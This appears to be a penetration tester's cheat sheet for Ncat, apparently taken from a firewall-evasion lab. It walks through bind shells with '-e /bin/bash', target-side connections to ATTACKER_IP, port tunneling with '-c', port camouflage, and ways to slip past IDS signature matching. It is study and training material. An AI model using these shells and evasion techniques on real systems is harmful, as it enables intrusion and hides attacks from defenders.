Ncat - networking utility which reads and writes data across networks
Source: https://nmap.org/ncat/

Reverse shell Generators:
https://www.revshells.com/
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Usage:
  nc -lvnp PORT_NUM       To listen using TCP where port number is the port you want to listen to
                          If the port number is less than `1024`, you need to run `nc` as root
  nc TARGET_IP PORT_NUM   To connect to an Ncat instance listening on a TCP port

Options:
  -l   Tells ncat to listen for incoming connections
  -v   Gets more verbose output as ncat binds to a source port and receives a connection
  -n   Avoids resolving hostnames
  -p   Specifies the port number that ncat will listen on
  -u   Listen using UDP

Network Security Evasion via Protocol Manipulation:
Rely on a Different Protocol:
  nc -ulvnp PORT_NUM        To listen using UDP where port number is the port you want to listen to
                            Note that unless you add -u, ncat will use TCP by default
  nc -u TARGET_IP PORT_NUM  To connect to an Ncat instance listening on a UDP port

Informational:
  Consider the following two examples:
    Running nc -lvnp 25 on the attacker system and connecting to it will give the impression that
    it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
    Executing nc -ulvnp 162 on the attacker machine and connecting to it will give the illusion
    that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.

Manipulate (Source) TCP/UDP Port:
  nc -ulvnp 53           You can try to camouflage the traffic as if it is some DNS traffic to listen on UDP port `53`, as a DNS server would
  nc -u ATTACKER_IP 53   On the target, you can make it connect to the listening server
  nc -lvnp 80            Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server
  nc ATTACKER_IP 80      On the target, you can make it connect to the listening server

Modify the data:
  If you want to use Ncat to create a bind shell, the following command: `ncat -lvnp 1234 -e /bin/bash`
  tells ncat to listen on TCP port `1234` and bind Bash shell to it. If you want to detect packets containing
  such commands (wireshark), you need to think of something specific to match the signature but not too specific.
    - Scanning for ncat -lvnp can be easily evaded by changing the order of the flags.
    - Inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat  -` which would still run correctly on the target system.
    - If the IDS is looking for `ncat`, then we need to consider more sophisticated approaches depending on the target system/application. 
    One option would be to use a different command such as nc socat. Alternatively, you can consider a different encoding if the target system can process it properly.

Three common firewall evasion techniques are:
	- Port hopping
	- Port tunneling
	- Use of non-standard ports

Evasion Using Port Hopping:
  Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. 
  In other words, the application might try different ports till it can successfully establish a connection. Some “legitimate” applications
  use this technique to evade firewalls. There is another type of port hopping where the application establishes the connection on one port 
  and starts transmitting some data; after a while, it establishes a new connection on (i.e., hopping to) a different port and resumes sending more data.
  The purpose is to make it more difficult for the blue team to detect and track all the exchanged traffic.

  ncat -lvnp 1025         For example, run on the AttackBox to listen on TCP port 1025
                          Then we want to test if the target machine can connect to the AttackBox on TCP port 1025
                          On the web server, we can use Netcat to connect to the target port using the command `ncat ATTACKBOX_IP 1024` 
                          (if possible, for example by exploiting vulnerable service that allows RCE) to connect to the AttackBox at TCP port `1024`.
                          We want to check if the firewall is configured to allow connections. If the connection from the machine can
                          pass through the firewall, we will be notified of the successful connection on the AttackBox terminal, if not, try 
                          port hopping technique and listening on different port and then connect to it from the webserver

Evasion Using Port Tunneling:
  Port tunneling is also known as *port forwarding* and *port mapping*. In simple terms, this technique forwards the packets sent to one destination
  port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system. 
  Consider the case where you have a server behind the firewall that you cannot access from the outside. However, you discovered that the firewall 
  does not block specific port(s). You can use this knowledge to your advantage by tunneling the traffic via a different port.

  ncat -lvnp 443 -c "ncat TARGET_SERVER 25"    Let’s say that we can run a command of our choice on one of the systems behind the firewall. 
                                               We can use that system to forward our packets to the SMTP server using command herein.
                                               As a result, `ncat` will listen on port `443`, but it will forward all packets to port `25`
                                               on the target server. Because in this case, the firewall is blocking port `25` and allowing port `443`,
                                               port tunneling is an efficient way to evade the firewall

Options:
  -lvnp 443         Listens on TCP port 443
  -c or --sh-exec   Executes the given command via /bin/sh
  "ncat TARGET_SERVER 25" 
                    Connects to the target server at port 25

Evasion Using Non-Standard Ports:
  ncat -lvnp PORT_NUMBER -e /bin/bash
                    Creates a backdoor via the specified port number that lets you interact with the Bash shell
  ncat MACHINE_IP PORT_NUMBER
                    On the AttackBox, we can run ncat to connect to the target machine and interact with its shell
                    Considering the case that we have a firewall, it is not enough to use `ncat` to create a backdoor
                    unless we can connect to the listening port number. Moreover, unless we run `ncat` as a
                    privileged user, `root`, or using `sudo`, we cannot use port numbers below `1024`

Options:
  -e, --exec  Executes the given command
  /bin/bash   Location of the command we want to execute
